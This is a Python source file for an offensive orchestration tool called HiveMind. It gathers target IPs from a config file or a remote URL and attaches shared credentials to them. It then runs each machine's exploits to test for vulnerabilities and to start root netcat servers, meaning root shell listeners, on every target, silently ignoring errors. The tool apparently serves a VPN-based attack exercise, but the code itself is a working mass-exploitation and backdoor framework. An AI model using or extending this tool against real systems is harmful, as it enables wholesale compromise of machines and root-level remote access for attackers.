from TargetMachine import TargetMachine
import requests
import yaml
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_ORANGE = '\033[93m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class HiveMind:
	"""
	HiveMind keeps track of all target machines and allows you to mass-control machines
	"""
	def __init__(self) -> None:
		self.parsed_config = self.read_config_file()
		self.target_machines = {}

	def read_config_file(self):
		config_file_location = "config.yaml"
		logger.debug(f"Reading config file `{config_file_location}`...")
		with open(config_file_location, 'r') as file_in:
			parsed_config = yaml.safe_load(file_in)
		logger.debug(f"Successfully read config file `{config_file_location}`.")
		return parsed_config

	def add_new_target_machines_from_config(self):
		logger.info(f"Updating list of target machines based on the local config file...")
		target_ips = self.parsed_config["ips"]
		credentials = self.parsed_config["credentials"]
		added_ips = []
		for ip in target_ips:
			if ip not in self.target_machines:
				added_ips.append(ip)
				new_user = TargetMachine(ip_address=ip, credentials=credentials)
				self.target_machines[ip] = new_user
		if len(added_ips) == 0:
			logger.info("All IPs are already in the list of target machines.")
		else:
			logger.info(f"Successfully added the following IPs: {added_ips}.")

	def add_new_target_machines_from_ip_list(self):
		"""
		Reads a list of IPs from a URL and updates the target machines based on that list
		"""
		try:
			ip_list_url = self.parsed_config["ip_list_url"]
			logger.info(f"Getting the list of target machines from `{ip_list_url}`...")
			server_response = requests.get(ip_list_url, timeout=3)
			server_response_text = server_response.text
			list_of_ips = server_response_text.split()

			for ip in list(self.target_machines): # use a list to avoid "dictionary changed size during iteration"
				if ip not in list_of_ips:
					logger.info(f"Removing `{ip}` from the list of IPs because it disconnected from the VPN.")
					self.target_machines.pop(ip)

			credentials = self.parsed_config["credentials"]
			added_ips = []
			for ip in list_of_ips:
				if ip not in self.target_machines:
					new_user = TargetMachine(ip_address=ip, credentials=credentials)
					self.target_machines[ip] = new_user
					added_ips.append(ip)
			if len(added_ips) == 0:
				logger.info("All IPs are already in the list of target machines.")
			else:
				logger.info(f"Successfully added {len(added_ips)} new IPs: {added_ips}.")

			return self.target_machines
		except Exception:
			logger.warning(f"Failed to get a list of target machines from `{ip_list_url}`.")
			return False

	def test_all_machines_for_vulnerabilities(self):
		for ip, machine in self.target_machines.items():
			for exploit in machine.exploits:
				exploit.test_if_vulnerable()

	def start_root_netcat_server_on_all_machines(self):
		for ip, machine in self.target_machines.items():
			for exploit in machine.exploits:
				try:
					exploit.start_root_netcat_server()
				except Exception:
					pass

def main():
	hivemind = HiveMind()
	hivemind.add_new_target_machines_from_config()
	print(hivemind.target_machines)

if __name__ == "__main__":
	main()
